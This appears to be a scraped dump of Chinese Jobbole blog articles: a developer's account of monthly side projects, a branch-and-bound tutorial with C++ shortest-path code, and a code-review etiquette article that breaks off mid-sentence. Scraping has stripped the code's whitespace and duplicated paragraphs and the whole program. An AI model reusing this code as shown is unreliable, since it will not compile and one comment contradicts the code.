"本文由伯乐在线-精算狗翻译。未经许可，禁止转载！英文出处：MarkJohnson。欢迎加入翻译组。2016年我曾定了一个目标——每个月都要学点新东西。最终，我发布了6个新项目。下面我要对这些项目以及我学到的东西做个总结。回望这一年，我成功发布了尽可能多的副项目，同时有一份超过了全职工作的工作、和家人度过了高质量的时光（我有两个孩子和一位非常有耐心的妻子）、作为兼职教授教书、还兼职提供咨询服务。这些对我来说似乎有点疯狂。人们容易把缺乏时间视为阻碍自己做副项目的原因。我们常给自己找的借口是“只要有更多时间……”。我们还寻找花里胡哨的App或者任务管理技巧，来尝试在时间表中空出些时间来。但是，去年我学到的主要的一点就是，时间不是首要问题。你有足够的时间；你需要的是动力。好消息是，我们“应付得了”动力。在2017年我学到了几种应付动力的方法，我想跟你们分享一下。你必须得选一个你真正感兴趣的想法你只是不能对你不关心的事物保持热情，所以选一些你激情所在的事情来做。当你灵光一闪时，别让它溜走，用上它。即使这意味着你要在工作会议上草草记下些笔记。重要的是紧紧抓住这些灵感时刻，以求知若饥并保持对工作的好奇心。给自己准备一个工作时间表对我来说，这意味着每个月发布些东西。一旦我开始工作，我往往会搞砸。所以30天的限制确实能帮助我控制好这个趋势，有效利用我的动力。如果结果发现某个月的想法不中用，这也能给你一个机会去尝试新想法。至少你不会把一整年的时间浪费在它上面。你需要一个分享成果的公开截止日期这是重要的一点。在项目尾声时你会耗尽“动力库”。（最后10%是致命的。）唯一能助你度过动力低迷期的是，知道在另一头还有人等着看你的成果。分享工作成果的另一个好处是，给你一个为副项目收集支持性反馈的机会。我工作的地方AtlasLocal会在每月第一个周五举办全办公室范围的活动。我利用这项活动展示我前一个月的项目，而且总能收到在场的这些慷慨的伙伴的鼓励和支持。站出来分享你的成果，你会对你收到了多少支持而感到震惊的。...这项实验中最让我惊讶的部分大概就是，我对在2018年发布更多工作更加充满动力，远不是在最后筋疲力尽。我会鼓励你在新的一年里应付动力问题，并发布一些你已经考虑了一段时间的想法。如果你尝试了，那我很乐意洗耳恭听。如果你对我在2017年的工作成果的细节感兴趣，请继续阅读！...一月项目：Pers0nal1ty.com可视化比较团队最强特点和最弱特点的个性类型我已经入迈尔斯·布里格斯类型指标（MBTI）的坑一段时间了。尽管我不把它看成是规范，也不认为它有那么科学，它仍是一个理解与我不同的人的有用框架。很多痴迷于个性的人没有意识到的是，MBTI系统是基于认知功能的。认知功能是由现代心理学之父CarlJung在上世纪20年代创造的。我想深挖一下，并进一步学习它。同时，我看了HBO的《西部世界》，看到了下面这一幕：我超爱这类科幻用户界面，它马上吸引了我的注意力。我想，如果我能基于人们的MBTI特征，建他们各自的“角色档案”会怎么样呢？为什么不呢？为了该项目做准备，我读了“MBTI圣经”，Myers和Briggs合著的《GiftsDiffering》，并着手构建一个系统，该系统可以根据MBTI系统的基础——认知功能来生成雷达图。最后，我以《西部世界》的用户界面为核心，因为我（和其他beta测试者）发现，将多人重叠在同一张雷达图上以获得一群人之间的关系的能力更为实用。如果我自己也这么说的话，结果确实很有趣。试试输入团队成员的个性类型或者你和你伴侣的个性类型：二月：Sheetcake登录页面制作任何网上登陆表单最简单的方法Sheetcake登陆页面我已经着手于Sheetcake几年了。它拥有非常小的一部分忠实用户（他们中的大多数都认识我或者与我关系亲密的人）。SheetCake趣事：2012年，我在48小时内完成了第一个版本。这是年轻一点的我演示这个48小时版本的视频我已经重新写了4次！第一版是用了Backbone.js+Node.js。第二版是用了Backbone+Marionette+Firebase。第三版是用了React+Firebase（全都用了CoffeeScript）。第四版，也是最终版，是用了ES6、React和Firebase。使用Sheetcake的人往往连着用了好几年；然而还没有商业模型。Sheetcake在某几方面的确做得很好（比如ZeroDay注册），所以我想为它制作一个登录页面，以推销这些优点。我从一个模版开始，这是它的最终版本。三月：NeTi聊天机器人向我外向的机器人助手提有关于我的问题NeTi聊天机器人去年早些时候，聊天机器人大火。尽管我从来不对聊天机器人能自己去某地抱什么希望，但是它们的对话A.I.属性还是吸引了我，我想进一步了解它。我是个内向的人，一般十分不擅长分享自己的事情。所以我想创造一个外向的机器人，它可以回答一些关于我的简单问题，这可能很有趣。如果我是个外向的人，我会拥有某些认知功能，NeTi就得名于此。给提问意图分类的A.I.部分是用Wit.ai构建的，Wit.ai使得构建A.I.容易多了。别让NeTi太生气，否则它可能会猛烈抨击你。四月：G.O.A.P.用目标导向型行动计划（GoalOrientedActionPlanning）构建令人信服的A.I.添加了移轴效果的代码截图——为什么不呢？在偶然间看到这篇文章后，我被一个游戏背景中描述的GOAP深深吸引。这个游戏叫F.E.A.R，对我来说有些怀旧气息。过去我参与过一些有基础A.I.的游戏的工作，从来没有遇到这项技术。我记得那时我觉得F.E.A.R的A.I.特别令人印象深刻、栩栩如生。在进一步研究后，这个方法最吸引人的地方不是结果多么令人信服，而是解决方法多简单优雅（尤其是跟更标准的A.I.方法比较，比如有限状态机（FiniteStateMachine））。所以我为四月份的项目写了一个JavaScript库来探索GOAP。一个基础执行简单得出乎意料（只要58行代码！）。五月：目标合同为你的目标签署责任合同。内嵌责任的目标合同五月我也开始了整整30天节食（Whole30diet）。我对我的饮食习惯变得满意，它也必然会影响我的能量级。整整30天节食（Whole30）对我来说进行得很顺利（节食期间我减了18磅，在接下来的几个月总共又减了35磅）。最重要的是，它确实均衡了我白天的能量，我感到更有动力了，也更专注了。看到了公开承诺和动力的相似之处，我决定将探索“目标合同”这个想法作为五月的副项目。...六月至十二月：TiltMaps为你喜爱的地点和记忆制作独一无二的地图海报TiltMaps主页这是一切的核心。我六月份的目标是做一个大家真正想买的产品。我最大的短板之一就是销售和营销，所以我想做一个可以帮助我练习的产品来进一步学习。我一直都对地图和生成艺术感兴趣，所以我有个吸引人的主意——创造一个工具，你可以用它来创造并购买你所喜爱的地点的海报。这个项目太过有野心，不能在一个月内作为副项目完成。所以我决定用2017年剩余的几个月来完成TiltMaps，并在发布前每个月都研究该产品的不同角度。我发现把一个较大的项目的不同部分分成月度项目能有效完成项目。六月至七月：TheSecretSauce™为了弄清楚是否有可能生成高分辨率3D地图，我第一个月大部分时间都用来做R&amp;D了。生成世界上任意地点的一张300dpi的3D地图不是任意API或者我找到的平台能开箱即用地支持的事情，所以我不得不发明我自己的方法来完成这件事。弄清它花掉了我这个月大部分的时间，但是当我找到了答案就变得出乎意料地简单了。之后，我构建了一个基础编辑器来开始制作真正的海报，并订购了几次打印测试。八月至九月：概念的证明（MVP）接下来几个月我构建了该产品有更多消费者的MVP。设计并不好，但是我还是让事情运转起来了，并且可以开始海报制作和打印的用户测试了。十月至十一月：品牌和市场营销接下来的几个月，我专注于让该项目准备好发布。尽管编辑器基本完成了，但是我还没有主页，而且市场营销方面还差得远。最终，通过在ZeroDay和我参加的一个研讨会上展示TiltMaps，我在项目发布前的一个月卖出了几张海报。这非常鼓舞人心，因为这是我第一次从副项目中卖出了东西。十二月：公开发布在ProductHunt上的发布比我预想中进行得顺利。我预计会卖出10张左右，但最终卖出了37张，而且仍然有订单进来。制作人们想买的东西感觉很好，而且它是一个很好的测试平台，可以尝试那些可能会在我的全职工作中发挥作用的、不同的广告和销售策略。我计划2018年继续致力于TiltMaps。但愿我能从其中获得体面的、有趣的收入。...总结完毕。感谢您读完全文。有任何想法或者反馈？我将洗耳恭听。在下面评论或者在Twitter上与我联络。1赞3收藏评论关于作者：精算狗简介还没来得及写:）个人主页·我的文章·22·", "url_object_id": "a477d68fdad1a1b384e0ae7fb5c03095"},{"title": "分支限界法", "url": "http://blog.jobbole.com/114061/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/6093f32a122633db22eb695f0d6cb461.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,0,4, ,·", "content": "原文出处：独酌逸醉分支限界法与回溯法（1）求解目标：回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意义下的最优解。（2）搜索方式的不同：回溯法以深度优先的方式搜索解空间树，而分支限界法则以广度优先或以最小耗费优先的方式搜索解空间树。分支限界法的基本思想分支限界法常以广度优先或以最小耗费（最大效益）优先的方式搜索问题的解空间树。在分支限界法中，每一个活结点只有一次机会成为扩展结点。活结点一旦成为扩展结点，就一次性产生其所有儿子结点。在这些儿子结点中，导致不可行解或导致非最优解的儿子结点被舍弃，其余儿子结点被加入活结点表中。此后，从活结点表中取下一结点成为当前扩展结点，并重复上述结点扩展过程。这个过程一直持续到找到所需的解或活结点表为空时为止。常见的两种分支限界法（1）队列式(FIFO)分支限界法按照队列先进先出（FIFO）原则选取下一个结点为扩展结点。（2）优先队列式分支限界法按照优先队列中规定的优先级选取优先级最高的结点成为当前扩展结点。一、单源最短路径问题1、问题描述在下图所给的有向图G中，每一边都有一个非负边权。要求图G的从源顶点s到目标顶点t之间的最短路径。下图是用优先队列式分支限界法解有向图G的单源最短路径问题产生的解空间树。其中，每一个结点旁边的数字表示该结点所对应的当前路长。找到一条路径：目前的最短路径是8，一旦发现某个结点的下界不小于这个最短路进，则剪枝：同一个结点选择最短的到达路径：2.剪枝策略在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。在算法中，利用结点间的控制关系进行剪枝。从源顶点s出发，2条不同路径到达图G的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。3.算法思想解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。算法从图G的源顶点s和空优先队列开始。结点s被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点i到顶点j有边可达，且从源出发，途经顶点i再到顶点j的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。实现2.剪枝策略在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。在算法中，利用结点间的控制关系进行剪枝。从源顶点s出发，2条不同路径到达图G的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。3.算法思想解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。算法从图G的源顶点s和空优先队列开始。结点s被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点i到顶点j有边可达，且从源出发，途经顶点i再到顶点j的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。实现/*主题：单源最短路径问题*作者：chinazhangjie*邮箱：chinajiezhang@gmail.com*开发语言：C++*开发环境：MircosoftVirsualStudio2008*时间:2010.11.01*/#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;queue&gt;#include&lt;limits&gt;usingnamespacestd;structnode_info{public:node_info(inti,intw):index(i),weight(w){}node_info():index(0),weight(0){}node_info(constnode_info&amp;ni):index(ni.index),weight(ni.weight){}friendbooloperator&lt;(constnode_info&amp;lth,constnode_info&amp;rth){returnlth.weight&gt;rth.weight;//为了实现从小到大的顺序}public:intindex;//结点位置intweight;//权值};structpath_info{public:path_info():front_index(0),weight(numeric_limits&lt;int&gt;::max()){}public:intfront_index;intweight;};//singlesourceshortestpathsclassss_shortest_paths{public:ss_shortest_paths(constvector&lt;vector&lt;int&gt;&gt;&amp;g,intend_location):no_edge(-1),end_node(end_location),node_count(g.size()),graph(g){}//打印最短路径voidprint_spaths()const{cout&lt;&lt;\"minweight:\"&lt;&lt;shortest_path&lt;&lt;endl;cout&lt;&lt;\"path:\";copy(s_path_index.rbegin(),s_path_index.rend(),ostream_iterator&lt;int&gt;(cout,\"\"));cout&lt;&lt;endl;}//求最短路径voidshortest_paths(){vector&lt;path_info&gt;path(node_count);priority_queue&lt;node_info,vector&lt;node_info&gt;&gt;min_heap;min_heap.push(node_info(0,0));//将起始结点入队while(true){node_infotop=min_heap.top();//取出最大值min_heap.pop();//已到达目的结点if(top.index==end_node){break;}//未到达则遍历for(inti=0;i&lt;node_count;++i){//顶点top.index和i间有边，且此路径长小于原先从原点到i的路径长if(graph[top.index][i]!=no_edge&amp;&amp;(top.weight+graph[top.index][i])&lt;path[i].weight){min_heap.push(node_info(i,top.weight+graph[top.index][i]));path[i].front_index=top.index;path[i].weight=top.weight+graph[top.index][i];}}if(min_heap.empty()){break;}}shortest_path=path[end_node].weight;intindex=end_node;s_path_index.push_back(index);while(true){index=path[index].front_index;s_path_index.push_back(index);if(index==0){break;}}}private:vector&lt;vector&lt;int&gt;&gt;graph;//图的数组表示intnode_count;//结点个数constintno_edge;//无通路constintend_node;//目的结点vector&lt;int&gt;s_path_index;//最短路径intshortest_path;//最短路径};intmain(){constintsize=11;vector&lt;vector&lt;int&gt;&gt;graph(size);for(inti=0;i&lt;size;++i){graph[i].resize(size);}for(inti=0;i&lt;size;++i){for(intj=0;j&lt;size;++j){graph[i][j]=-1;}}graph[0][1]=2;graph[0][2]=3;graph[0][3]=4;graph[1][2]=3;graph[1][5]=2;graph[1][4]=7;graph[2][5]=9;graph[2][6]=2;graph[3][6]=2;graph[4][7]=3;graph[4][8]=3;graph[5][6]=1;graph[5][8]=3;graph[6][9]=1;graph[6][8]=5;graph[7][10]=3;graph[8][10]=2;graph[9][8]=2;graph[9][10]=2;ss_shortest_pathsssp(graph,10);ssp.shortest_paths();ssp.print_spaths();return0;}1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491502.剪枝策略在算法扩展结点的过程中，一旦发现一个结点的下界不小于当前找到的最短路长，则算法剪去以该结点为根的子树。在算法中，利用结点间的控制关系进行剪枝。从源顶点s出发，2条不同路径到达图G的同一顶点。由于两条路径的路长不同，因此可以将路长长的路径所对应的树中的结点为根的子树剪去。3.算法思想解单源最短路径问题的优先队列式分支限界法用一极小堆来存储活结点表。其优先级是结点所对应的当前路长。算法从图G的源顶点s和空优先队列开始。结点s被扩展后，它的儿子结点被依次插入堆中。此后，算法从堆中取出具有最小当前路长的结点作为当前扩展结点，并依次检查与当前扩展结点相邻的所有顶点。如果从当前扩展结点i到顶点j有边可达，且从源出发，途经顶点i再到顶点j的所相应的路径的长度小于当前最优路径长度，则将该顶点作为活结点插入到活结点优先队列中。这个结点的扩展过程一直继续到活结点优先队列为空时为止。实现/*主题：单源最短路径问题*作者：chinazhangjie*邮箱：chinajiezhang@gmail.com*开发语言：C++*开发环境：MircosoftVirsualStudio2008*时间:2010.11.01*/#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;queue&gt;#include&lt;limits&gt;usingnamespacestd;structnode_info{public:node_info(inti,intw):index(i),weight(w){}node_info():index(0),weight(0){}node_info(constnode_info&amp;ni):index(ni.index),weight(ni.weight){}friendbooloperator&lt;(constnode_info&amp;lth,constnode_info&amp;rth){returnlth.weight&gt;rth.weight;//为了实现从小到大的顺序}public:intindex;//结点位置intweight;//权值};structpath_info{public:path_info():front_index(0),weight(numeric_limits&lt;int&gt;::max()){}public:intfront_index;intweight;};//singlesourceshortestpathsclassss_shortest_paths{public:ss_shortest_paths(constvector&lt;vector&lt;int&gt;&gt;&amp;g,intend_location):no_edge(-1),end_node(end_location),node_count(g.size()),graph(g){}//打印最短路径voidprint_spaths()const{cout&lt;&lt;\"minweight:\"&lt;&lt;shortest_path&lt;&lt;endl;cout&lt;&lt;\"path:\";copy(s_path_index.rbegin(),s_path_index.rend(),ostream_iterator&lt;int&gt;(cout,\"\"));cout&lt;&lt;endl;}//求最短路径voidshortest_paths(){vector&lt;path_info&gt;path(node_count);priority_queue&lt;node_info,vector&lt;node_info&gt;&gt;min_heap;min_heap.push(node_info(0,0));//将起始结点入队while(true){node_infotop=min_heap.top();//取出最大值min_heap.pop();//已到达目的结点if(top.index==end_node){break;}//未到达则遍历for(inti=0;i&lt;node_count;++i){//顶点top.index和i间有边，且此路径长小于原先从原点到i的路径长if(graph[top.index][i]!=no_edge&amp;&amp;(top.weight+graph[top.index][i])&lt;path[i].weight){min_heap.push(node_info(i,top.weight+graph[top.index][i]));path[i].front_index=top.index;path[i].weight=top.weight+graph[top.index][i];}}if(min_heap.empty()){break;}}shortest_path=path[end_node].weight;intindex=end_node;s_path_index.push_back(index);while(true){index=path[index].front_index;s_path_index.push_back(index);if(index==0){break;}}}private:vector&lt;vector&lt;int&gt;&gt;graph;//图的数组表示intnode_count;//结点个数constintno_edge;//无通路constintend_node;//目的结点vector&lt;int&gt;s_path_index;//最短路径intshortest_path;//最短路径};intmain(){constintsize=11;vector&lt;vector&lt;int&gt;&gt;graph(size);for(inti=0;i&lt;size;++i){graph[i].resize(size);}for(inti=0;i&lt;size;++i){for(intj=0;j&lt;size;++j){graph[i][j]=-1;}}graph[0][1]=2;graph[0][2]=3;graph[0][3]=4;graph[1][2]=3;graph[1][5]=2;graph[1][4]=7;graph[2][5]=9;graph[2][6]=2;graph[3][6]=2;graph[4][7]=3;graph[4][8]=3;graph[5][6]=1;graph[5][8]=3;graph[6][9]=1;graph[6][8]=5;graph[7][10]=3;graph[8][10]=2;graph[9][8]=2;graph[9][10]=2;ss_shortest_pathsssp(graph,10);ssp.shortest_paths();ssp.print_spaths();return0;}测试数据（图）测试结果minweight:8path:02691012minweight:8path:0269101赞1收藏评论", "url_object_id": "17234c664be7a7620fca5c849015008f"},{"title": "如何做人性化的代码审查？", "url": "http://blog.jobbole.com/113665/", "create_date": "2018-09-13", "front_image_url": ["http://wx1.sinaimg.cn/mw690/7cc829d3gy1frr57nj93bj20lc0oe0xi.jpg"], "praise_nums": 1, "fav_nums": 4, "comments_nums": 2, "tags": "2,0,1,8,/,0,5,/,3,0, ,·", "content": "本文由伯乐在线-精算狗翻译，小米云豆粥校稿。未经许可，禁止转载！英文出处：MichaelLynch。欢迎加入翻译组。最近，我一直在读有关代码审查最佳范例的文章。我注意到这些文章的关注点是找到bug，而忽略了代码审查其他的部分。用建设性、专业的问题沟通方式？不相关！只要识别出所有的bug，剩下的部分会水到渠成。我只能假设我读过的这些文章都来自未来，那时候所有的开发人员都是机器人。在那个世界，你的队友欢迎对其代码未经过推敲措辞的批评，因为处理这样的信息能温暖他们冰冷的机器人之心。我要做一个大胆的假设，你想要在当前世界改进代码审查，此时你的队友都是人类。我还要做一个更大胆的假设，你与同事之间积极的关系本身就是一个目的，而不仅仅是一个可调整的变量来最小化缺陷的平均成本。在这些情况下，你的审查实践会发生怎样的变化呢？在这篇文章中，我讨论了一些技巧，把代码审查既看作是技术过程，也看作是社会过程。什么是代码审查?“代码审查（codereview）”这一术语可以指一系列活动，从简单地站在队友身后读读代码，到20人与会的单行代码分析。我用这一术语指正式的、书面的过程，但也不像一系列现场代码审查会议那么重大。代码审查的参与者包括作者以及审查者：作者写代码并把代码送去审查，审查者读代码并决定代码什么时候就绪并入团队的代码库。一次审查可以由多个审查者完成，但是我做了简化的假设——你是唯一的审查者。在代码审查开始之前，作者必须创建一个变更表。作者想要将源代码并入团队代码库，变更表包括一系列源代码的变更。当作者把变更表发给审查者时，审查就开始了。代码审查是循环发生的。每个循环都是作者与审查者之间完整的往返：作者发送变更，审查者给予变更的书面反馈。每次代码审查都包括一次或者更多的循环。当审查者批准了这些变更，审查结束。这通常指的是给出LGTM，“我觉得不错（looksgoodtome）”的简写。这为什么很难？如果程序员给你发了一份变更表，他们觉得这个变更表棒极了。你又给他们写了一份详细的清单，解释为什么这个变更表并不好。这是需要小心处理的信息。这是我不想念IT的一个原因，因为程序员是非常不可爱的人……比如，在航空业，那些过分高估了自己技术水平的人都死了。PhilipGreenspun，ArsDigita的联合创始人，引自《FoundersatWork》。作者容易把对其代码的批评解读为暗示他们不是合格的程序员。代码审查是一个分享知识和做工程决定的机会。但是如果作者把讨论理解为个人攻击，这个目标无法达成。除此之外，你还面临着书面传达想法的挑战，词不达意的风险会更高。作者听不到你的语气，也看不到你的肢体语言，所以清晰地、小心地传达你的反馈更为重要。对一个有戒备心的作者来说，一句无冒犯意味的批注，比如“你忘了关闭文件句柄”，可以被理解成“真不敢相信你忘了关闭文件句柄！你真是个傻子。”技巧让电脑做无聊的部分用风格指南平息风格争论马上开始审查从高级别开始，逐步向下慷慨地使用代码示例永远别说“你”把反馈表达成请求，而不是指令把批注与原则联系在一起，而不是观点让电脑做无聊的部分在会议和邮件的干扰下，可用来专注于代码的时间很少。你的精神毅力更是短缺。读队友的代码是认知上的负担，要求高强度的专注。别把这些资源浪费在电脑能做的任务上，尤其是当电脑能做得更好的时候。空白错误是一个显著的例子。比较一下人类审查者找到缩进错误并与作者一起改正所花费的精力，和仅仅使用一个自动排版工具所花费的精力：人类审查者需要的精力排版工具需要的精力1.审查者寻找空白错误，找到错误的缩进2.审查者写批注，指出错误缩进3.审查者重新读批注，确保措辞清晰，不含指责意味4.作者读批注5.作者改正代码缩进6.审查者核实作者适当地处理了批注无！右边是空的，因为作者用了一个代码编辑器，每次他们点击“保存”时，该代码编辑器会自动规定空白的格式。在最糟的情况下，作者把代码发出去以供审查，持续集成解决方法报告说空格错误。作者在不需要审查者顾虑的情况下，修正这个问题。在代码审查中寻找可以被自动解决的机械性任务。以下是常见的例子：任务自动解决方法验证代码的构建持续集成方法，比如Travis或者CircleCI证实通过了自动测试持续集成方法，比如Travis或者CircleCI验证代码空白与团队风格一致代码排版器，比如ClangFormat(C/C++排版器)或者gofmt(Go排版器)识别未使用的输入或者变量代码linter，比如pyflakes(Pythonlinter)或者JSLint(JavaScriptlinter)自动化使你作为审查者能做出更多有意义的贡献。当你能忽略一整个类别的问题，比如输入的排序或者源文件命名的约定，你能够关注更有趣的事情，比如函数错误或者可读性缺陷。自动化也能给作者带来好处。自动化使作者用几秒钟发现粗心的错误，而不是几小时。即时反馈使得从错误中学习更容易，修正错误的代价也更小，因为作者脑海中还有相关的背景。另外，如果他们不得不听到自己犯下的愚蠢错误，对自尊心来说，从电脑那听到要比从你那听到更容易被接受。和你的团队一起将这些自动检查加入代码审查的工作流程中（例如，在Git中的pre-commithooks或者Github中的webhooks）。如果审查过程要求作者手动运行这些检查，你会损失大部分好处。作者总是会忘记一些情况，迫使你继续审查简单的问题，而这些问题本来就能被自动处理。用风格指南平息风格争论关于风格的争论浪费了审查的时间。一致的风格确实重要，但是代码审查不是争论花括号位置的时候。在审查中消除风格争论的最佳办法是，遵守一个风格指南。好的风格指南不仅定义了像命名习惯或者空白规则这样的表面元素，而且定义了怎样使用给定编程语言的特征。比如，JavaScript和Perl都包含了一些功能——他们提供了许多实现相同逻辑的方法。风格指南定义了做事的唯一方法，这样不会以一半队员用了一组语言特征而另一半队员用了完全不同的一组特征收尾。一旦有了一个风格指南，你就不需要浪费审查循环，来跟作者争论到底谁的命名习惯最好。只要遵从风格指南然后继续就行。如果你的风格指南没有指定某个特定问题的约定，那它一般都不值得争论。如果你遇到一个风格指南未涉及的问题，它又重要到需要讨论，和团队一起推敲。然后把决定加到风格指南，这样你们永远不需要再进行一次这个讨论。选择1：采纳一个现存的风格指南如果从网上搜索，你能找到已发布的风格指南可供使用。Google的编程风格指南是最知名的，但是如果它的风格不适合你，你可以找到其他的指南。通过采纳一个现存的指南，不需要从头创造一个风格指南的大量花费就能继承其好处。坏处是组织为他们自己特别的需要优化其风格指南。比如，Google的风格指南在使用新语言特征上比较保守，因为他们有一个巨大的代码库，其中的代码要在所有东西上运行，从家用路由器到最新的iPhone。如果你们是一个只有一个产品的四人小组，你可能选择在使用前沿语言特征或者扩展时更大胆。选择2：不断创造你自己的风格指南如果你不想采纳现存的指南，你可以自己创造一个。在代码审查中每产生一次风格争论，向整个团队提问来决定官方约定应该是什么。当你们达成共识，把决定编进风格指南中。我倾向于将团队的风格指南作为源控制下的Markdown（例如GitHub页面）。这样，对风格指南的任何改动都需要通过普通的审查过程——某人得明确批准改动，而且团队中的每个人都有提出疑虑的机会。Wikis和Google文件都是可接受的选择。选择3：混合方法合并选择1和选择2，你可以采纳现存的风格指南作为基础，然后用本地风格指南来扩展或者覆盖这个基础。一个好例子是Chromium的C++风格指导。它用Google的C++风格指导作为基础，但是在其上添上自己的改动和附加。马上开始审查将代码审查视为高优先级。当你真正阅读代码并反馈时，慢点来，但是要马上开始审查——最好在几分钟内开始。如果队员发给你一个变更表，这可能意味着直到你完成审查前，他们会卡在其他工作上。理论上，源控制系统使作者能建起新的分支，继续工作，然后从审查中把变动合并进新分支。实际上，一共有大约四个开发者能够高效地做这件事。其他人要花很长时间来清理三方差异，以致于抵消掉了等待审查完成这段时间里的进步。你马上开始审查，就创造了一个良性循环。你的审查时间完全变成了一个与作者的变更表大小和复杂度相关的函数。这激励作者发送短小、范围狭窄的变更表。对你来说这样的变更表审查起来更容易，也更愉悦，所以你能更快地审查，循环继续。想象一下你的队员要执行一个新特征，这个特征要求1000行代码变更。如果他们知道你能在大概2小时内完成一个200行的变更表的审查，他们可以把特征拆分成各包含200行的变更表，然后在一两天内检查完整个特征。但是，如果无论大小你都要花一天来完成所有的代码审查，现在就要花一周时间才能检查完整个特征。你的队员不想傻坐一周，所以他们被激励着去发送更大的代码审查，比如每个包含500到600行。这样审查起来花销更大，反馈也更差，因为记600行变更表的背景要比200行变更表难。一个审查循环的最大周期应该是一个工作日。如果你正在处理一个更高优先级的问题，不能在一天内完成一个审查循环，让你的队员知悉并给予他们把审查交给别人的机会。如果你一个月被强制回绝审查超过一次，可能意味着你的团队需要放慢脚步，这样你能保持理智的开发实践。从高级别开始，逐步向下在一个既定的审查循环中，你写的批注越多，让作者感觉受打压的风险越大。准确的界限随开发者的不同而不同，但是一个审查循环中20到50个批注一般是危险区的开始。如果你担心把作者淹没在批注的海洋里，约束你自己在早期循环中反馈高级别的问题。注意重新设计类接口或者拆分复杂函数这样的问题。等到这些问题都解决了再去处理低级别的问题，比如变量命名或者代码评论的清晰度。一旦作者整合了你高级别的批注，低级别的批注可能会变得无意义。把低级别的批注推迟到后期的循环中，你可以把自己从小心措辞的工作中解救出来，也免得作者处理不必要的批注。这个技巧也细分了审查过程中你所关注的抽象层，帮助你和作者用清晰、系统的方法完成变更表。慷慨地使用代码示例在一个理想的世界里，代码作者会感谢收到的每一次审查。这是他们学习的一个机会，也能防止他们犯错。事实上，有许多外部因素能导致作者负面地解读审查，怨恨你给他们批注。可能他们正面临着截止日期的压力，所以除了立刻不经审查的批准以外的东西都感觉像阻碍。可能你们没怎么在一起工作过，所以他们不相信你的反馈是好意的。一个让作者对审查过程感觉良好的方法是，在审查中找机会送他们礼物。所有开发者都爱收到的礼物是什么呢？当然是代码示例啦。如果通过写一些建议的改动来减轻作者的负担，就证明了作为审查者，你对时间很慷慨。比如，想象一下你的一个同事不熟悉Python的列表推导（listcomprehension）特征。他们给你发送了包含以下代码的审查：urls=[]forpathinpaths:url='https://'url+=domainurl+=pathurls.append(url)123456urls=[]forpathinpaths:url='https://'url+=domainurl+=pathurls.append(url)回复“能用列表推导（listcomprehension）简化这个吗？”会使他们苦恼，因为现在他们得花20分钟搜索他们之前从没用过的东西。收到像以下这样的批注他们会更开心：考虑用像这样的列表推导（listcomprehension）来进行简化：urls=['https://'+domain+pathforpathinpaths]1urls=['https://'+domain+pathforpathinpaths]这个技巧并不局限于单命令程序。我会经常建立我自己的代码分支，向作者展示概念的一个大型证明，比如拆分一个大型函数或者增加一个单元测试来覆盖一个附加边界情况。为清晰、无争议的改进保留此技巧。在上面列表推导（listcomprehension）示例中，极少有开发者会拒绝减少83%的代码行数。相反，如果你写了一个冗长的示例来演示某个变动“更好”，而这个变动是基于你自己的个人品味（比如，风格变动），代码示例让你看起来固执己见，而不是慷慨大方。限制你自己在每个审查循环中只写两到三个代码示例。如果你开始为作者写整个变更表，这标志着你觉得作者没能力写自己的代码。永远别说“你”这听起来挺怪异的，但是听我说：永远别在代码审查中使用“你”这个字。在审查中做的决定应该是基于什么能让代码更好，而不是谁出的主意。你的队员在他们的变更表中倾注了大量心血，而且很可能为自己的工作感到骄傲。他们听到对其工作的批评，自然反应是摆出防御和保护的姿态。组织反馈所使用的措辞，以最小化激起队员戒备心的风险。讲清楚你是在批评代码，而不是程序员。当作者在评论中看到“你”这个字，会将他们的注意力从代码转移到自己身上。这增加了他们把批评私人化的风险。考虑一下这个无害的评论：你拼错了“successfully”。作者可以把这个批注理解成两种不同的意思：理解1：嗨，好家伙！你拼错了“successfully”。但是我还是觉得你聪明！那可能就是个笔误。理解2：你拼错了“successfully”，笨蛋。把这个跟省略了“你”的批注比较一下：sucessfully-&gt;successfully后者是一个简单的修正而不是对作者的审判。幸运地是，在重新写反馈时避免使用“你”并不难。选择1：用“我们”替换“你”你能重命名这个变量，让它更具有描述性吗？比如seconds_remaining。变成：我们能重命名这个变量，让它更具有描述性吗？比如seconds_remaining。“我们”加强了团队对代码的集体责任。作者可能跳槽到一个不同的公司去，你也可能，但是拥有这个代码的团队会一直以不同的形式存在。当你明显期望作者自己做某些事的时候，说“我们”听起来会比较傻，但是傻要比指责好。选择2：移除句子的主语另一个避免使用“你”的方法是用省略句子主语的简化句子：建议重命名为更具有描述性的名称，比如seconds_remaining。你可以用被动语态实现相似的效果。我在技术写作中一般会避免像瘟疫一样使用被动语态，但是它是个有用的方法来避免使用“你”。变量应该被重命名为更具有描述性的名称，比如seconds_remaining。另一个选择是把它表述为一个问题，用“……如何”或者“……怎么样”开头：把变量重命名为更具有表述性的名称怎么样？比如seconds_remaining。把反馈表达成请求，而不